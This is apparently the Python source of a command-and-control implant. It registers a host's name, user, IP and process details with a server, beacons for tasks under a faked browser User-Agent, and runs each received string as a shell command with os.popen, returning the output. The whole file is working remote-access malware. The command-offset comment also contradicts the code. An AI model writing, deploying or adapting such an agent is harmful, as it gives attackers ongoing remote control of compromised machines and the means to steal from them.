import requests
import json
import socket
import time
import os
import sys
import random
import string
import platform



url = 'http://127.0.0.1/test'
magic = b"\x41\x41\x41\x41"
agentid = 234234  # this values is changed later with a random one
user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'


def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def checkin(data):
    print("[+] Checking in for taskings: "+str(data))
    requestdict = {"task": "gettask", "data": data}
    requestblob = json.dumps(requestdict).encode('utf-8')
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentid_bytes = agentid.ljust(4, b'\x00')[:4]
    agentheader = size_bytes + magic + agentid_bytes
    
    headers = {'User-Agent': user_agent}
    x = requests.post(url, headers=headers, data=agentheader + requestblob)
    print("[+] Checkin response: "+str(x.content))
    return x.content  # Return bytes for command parsing

def register():
    hostname = socket.gethostname()
    registerdict = {
        "AgentID": agentid.decode('utf-8'),  # str for JSON
        "Hostname": hostname,
        "Username": os.getlogin(),
        "Domain": "",
        "InternalIP": socket.gethostbyname(hostname),
        "Process Path": os.getcwd(),
        "Process ID": str(os.getpid()),
        "Process Parent ID": "0",
        "Process Arch": "x64",
        "Process Elevated": 0,
        "OS Build": "NOT IMPLEMENTED YET",
        "Sleep": 1,
        "Process Name": "python",
        "OS Version": str(platform.version())
    }
    
    # JSON → bytes
    registerblob = json.dumps(registerdict).encode('utf-8')
    requestdict = {"task": "register", "data": registerblob.decode('utf-8')}  # data as str
    requestblob = json.dumps(requestdict).encode('utf-8')
    
    # EXACTLY 12-byte header: 4(size) + 4(magic) + 4(AgentID)
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentid_bytes = agentid.ljust(4, b'\x00')[:4]  # Pad/truncate to exactly 4 bytes
    agentheader = size_bytes + magic + agentid_bytes
    
    print(f"[?] Register header: {agentheader.hex()}")
    print(f"[?] Register size: {size}")
    
    headers = {'User-Agent': user_agent}
    x = requests.post(url, headers=headers, data=agentheader + requestblob)
    return x.content.decode('utf-8', errors='ignore')  # bytes → str


def runcommand(command):
    print("[+] Running command: "+str(command))
    command = command.strip("\x00")
    if command == "goodbye":
        sys.exit(2)
    output = os.popen(command).read() + "\n"
    return output

def main():
    global agentid
    agentid = get_random_string(4).encode('utf-8')
    agentheader = magic + agentid
    sleeptime = 5
    registered = ""
    outputdata = ""

    #register the agent
    while registered != "registered":
        time.sleep(5)
        registered = register()
    print("REGISTERED!")

    #checkin for commands
    while True:
        commands = checkin(outputdata)
        outputdata = ""
        if len(commands) >= 4:
            try:
                # Extract commands after header
                commands_data = commands[4:]  # Skip 12-byte header
                print("[+] Commands data: "+str(commands_data))
                # Process commands (your existing logic)
                outputdata = runcommand(commands_data.decode('utf-8', errors='ignore')).strip("\n")
            except Exception as e:
                print("[+] Error: "+str(e))
        time.sleep(sleeptime)

if __name__ == "__main__":
    main()